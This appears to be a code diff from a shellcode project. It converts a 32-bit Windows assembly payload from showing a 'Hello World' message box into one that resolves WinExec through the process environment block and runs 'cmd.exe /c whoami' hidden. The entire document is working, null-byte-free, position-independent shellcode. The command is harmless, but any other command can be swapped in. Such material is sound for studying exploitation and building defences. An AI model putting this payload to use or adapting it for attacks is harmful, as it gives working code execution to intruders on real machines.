@@ -52,33 +52,21 @@ start:
   mov  ebx, [ebx]                  ; get pointer to ntdll.dll
   mov  ebx, [ebx]                  ; get pointer to kernel32.dll
   mov  ebx, [ebx + 0x10]           ; get pointer to BaseAddress of kernel32.dll
-  push LoadLibraryA.len
-  jmp  LoadLibraryA 
-_LoadLibraryA:
+  push WinExec.len
+  jmp  WinExec 
+_WinExec:
   push ebx 
-  call get_address                 ; get_address(kernel32.dll, 'LoadLibraryA', strlen('LoadLibraryA'))
-  jmp  User32
-_User32:
-  mov  esi, [esp]
-  mov  word [esi + User32.len], bp ; get dll pointer and add NULL termination to string
-  call eax                         ; LoadLibraryA('user32')
-  push MessageBoxA.len 
-  jmp  MessageBoxA
-_MessageBoxA:
-  push eax 
-  call get_address                 ; get_address(user32.dll, 'MessageBoxA', strlen('MessageBoxA'))
-  push ebp
-  push ebp
-  jmp  msg
-_msg:
+  call get_address                 ; get_address(kernel32.dll, 'WinExec', strlen('WinExec'))
+  push ebp                         ; push SW_HIDE (WinExec argument #2)
+  jmp  cmd
+_cmd:
   mov  esi, [esp] 
-  mov  word [esi + msg.len], bp    ; get message pointer and add NULL termination to string
-  push ebp
-  call eax                         ; MessageBox(NULL, message, NULL, NULL)
+  mov  word [esi + cmd.len], bp    ; get message pointer and add NULL termination to string
+  call eax                         ; WinExec(cmd, SW_HIDE(0))
   push ExitProcess.len
   jmp  ExitProcess
 _ExitProcess:
-  mov  ebx, [esp + 0x24]           ; load kernel32.dll address off of stack from call to 1st get_address()
+  mov  ebx, [esp + 0xC]            ; load kernel32.dll address off of stack from call to 1st get_address()
   push ebx
   call get_address                 ; get_address(kernel32.dll, "ExitProcess", strlen("ExitProcess"))
   push ebp
@@ -88,31 +76,18 @@ _ExitProcess:
 ; position independent code (PIC) data:
 ; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-LoadLibraryA:
-  call  _LoadLibraryA
+WinExec:
+  call  _WinExec
 .string:
-  ; https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
-  db "LoadLibraryA"
-.len: equ $ - LoadLibraryA.string
+  ; https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec
+  db "WinExec"
+.len: equ $ - WinExec.string
 
-User32:
-  call  _User32
+cmd:
+  call _cmd
 .string:
-  db "user32", 0x30, 0x30          ; NULL byte set at runtime (with a store WORD not BYTE)
-.len: equ $ - User32.string - 0x2  ; 2 byte offset to point to first temp 0x30 byte
- 
-MessageBoxA:
-  call _MessageBoxA
-.string:
-  ; https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa
-  db "MessageBoxA"
-.len: equ $ - MessageBoxA.string
-
-msg:
-  call _msg
-.string:
-  db "Hello World!", 0x30, 0x30    ; NULL byte set at runtime (with a store WORD not BYTE)
-.len: equ $ - msg.string - 0x2     ; 2 byte offset to point to first temp 0x30 byte
+  db "cmd.exe /c whoami", 0x30, 0x30 ; NULL byte set at runtime (with a store WORD not BYTE)
+.len: equ $ - cmd.string - 0x2       ; 2 byte offset to point to first temp 0x30 byte
 
 ExitProcess:
   call _ExitProcess
